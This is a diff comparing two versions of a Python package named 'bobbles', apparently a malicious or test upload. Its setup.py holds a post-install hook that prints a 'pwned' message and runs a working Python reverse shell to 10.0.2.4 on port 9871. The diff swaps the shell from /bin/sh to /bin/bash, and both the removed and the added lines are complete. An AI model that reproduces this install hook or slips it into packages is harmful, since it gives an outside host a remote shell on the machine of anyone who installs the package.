# Comparing `tmp/bobbles-190.0.2.tar.gz` & `tmp/bobbles-190.0.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "bobbles-190.0.2.tar", last modified: Tue Jun 27 08:33:49 2023, max compression
+gzip compressed data, was "bobbles-190.0.3.tar", last modified: Tue Jun 27 09:04:33 2023, max compression
```

## Comparing `bobbles-190.0.2.tar` & `bobbles-190.0.3.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxrwx---   0 root         (0) vboxsf     (998)        0 2023-06-27 08:33:49.445722 bobbles-190.0.2/
--rwxrwx---   0 root         (0) vboxsf     (998)      207 2023-06-27 08:33:49.445722 bobbles-190.0.2/PKG-INFO
-drwxrwx---   0 root         (0) vboxsf     (998)        0 2023-06-27 08:33:49.433722 bobbles-190.0.2/bobbles/
--rwxrwx---   0 root         (0) vboxsf     (998)      107 2023-06-27 08:29:33.000000 bobbles-190.0.2/bobbles/main.py
-drwxrwx---   0 root         (0) vboxsf     (998)        0 2023-06-27 08:33:49.441722 bobbles-190.0.2/bobbles.egg-info/
--rwxrwx---   0 root         (0) vboxsf     (998)      207 2023-06-27 08:33:49.000000 bobbles-190.0.2/bobbles.egg-info/PKG-INFO
--rwxrwx---   0 root         (0) vboxsf     (998)      148 2023-06-27 08:33:49.000000 bobbles-190.0.2/bobbles.egg-info/SOURCES.txt
--rwxrwx---   0 root         (0) vboxsf     (998)        1 2023-06-27 08:33:49.000000 bobbles-190.0.2/bobbles.egg-info/dependency_links.txt
--rwxrwx---   0 root         (0) vboxsf     (998)        8 2023-06-27 08:33:49.000000 bobbles-190.0.2/bobbles.egg-info/top_level.txt
--rwxrwx---   0 root         (0) vboxsf     (998)       38 2023-06-27 08:33:49.445722 bobbles-190.0.2/setup.cfg
--rwxrwx---   0 root         (0) vboxsf     (998)      877 2023-06-27 08:33:42.000000 bobbles-190.0.2/setup.py
+drwxrwx---   0 root         (0) vboxsf     (998)        0 2023-06-27 09:04:48.407416 bobbles-190.0.3/
+-rwxrwx---   0 root         (0) vboxsf     (998)      207 2023-06-27 09:04:48.407416 bobbles-190.0.3/PKG-INFO
+drwxrwx---   0 root         (0) vboxsf     (998)        0 2023-06-27 09:04:48.403416 bobbles-190.0.3/bobbles/
+-rwxrwx---   0 root         (0) vboxsf     (998)      107 2023-06-27 09:04:48.403416 bobbles-190.0.3/bobbles/main.py
+drwxrwx---   0 root         (0) vboxsf     (998)        0 2023-06-27 09:04:48.407416 bobbles-190.0.3/bobbles.egg-info/
+-rwxrwx---   0 root         (0) vboxsf     (998)      207 2023-06-27 09:04:48.000000 bobbles-190.0.3/bobbles.egg-info/PKG-INFO
+-rwxrwx---   0 root         (0) vboxsf     (998)      148 2023-06-27 09:04:48.000000 bobbles-190.0.3/bobbles.egg-info/SOURCES.txt
+-rwxrwx---   0 root         (0) vboxsf     (998)        1 2023-06-27 09:04:48.000000 bobbles-190.0.3/bobbles.egg-info/dependency_links.txt
+-rwxrwx---   0 root         (0) vboxsf     (998)        8 2023-06-27 09:04:48.000000 bobbles-190.0.3/bobbles.egg-info/top_level.txt
+-rwxrwx---   0 root         (0) vboxsf     (998)       38 2023-06-27 09:04:48.407416 bobbles-190.0.3/setup.cfg
+-rwxrwx---   0 root         (0) vboxsf     (998)      879 2023-06-27 09:04:48.403416 bobbles-190.0.3/setup.py
```

### Comparing `bobbles-190.0.2/setup.py` & `bobbles-190.0.3/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,20 +1,20 @@
 from setuptools import find_packages
 from setuptools import setup
 from setuptools.command.install import install
 import os
 import sys
 
-VERSION = 'v190.0.2'
+VERSION = 'v190.0.3'
 
 class PostInstallCommand(install):
      def run(self):
          install.run(self)
          print ("Hello Nade you've pwned a system")
-         os.system('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.4",9871));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')
+         os.system('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.4",9871));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'')
 
 setup(
         name='bobbles',
         author='nadedjk',
         author_email='nade@djk.com',
         version=VERSION,
         packages=['bobbles'],
```

